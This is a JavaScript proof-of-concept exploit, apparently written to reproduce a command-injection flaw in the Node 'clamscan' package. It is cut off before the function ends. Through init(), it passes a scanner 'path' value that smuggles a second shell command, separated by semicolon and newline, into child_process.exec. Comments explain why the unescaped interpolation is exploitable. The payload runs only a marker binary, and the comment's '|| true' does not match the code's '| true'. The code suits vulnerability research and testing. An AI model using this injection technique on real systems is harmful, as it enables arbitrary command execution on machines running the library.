```js
async function exploit() {
    const ClamScan = require('clamscan');
    const clam = new ClamScan();

    // During initialization, NodeClam calls `_is_clamav_binary()` for each enabled scanner.
    // This method naively interpolates the user-controlled `path` into a shell command:
    // `${path} --version` and passes it unescaped to `cp_exec()` (a wrapper around `child_process.exec`).
    await clam.init({
        clamscan: {
            // The leading semicolon (;) acts as a command separator in /bin/sh.
            // It forces the shell to ignore the intended binary execution, run our payload,
            // and use `|| true` to return exit code 0 so the validation loop doesn't
            // silently abort before the injection can be observed.
            path: ';\n/usr/bin/genpoc\n| true'
        },
        enabled: ['clamscan'] // Restrict verification to clamscan to trigger `_is_clamav_binary` immediately
    });
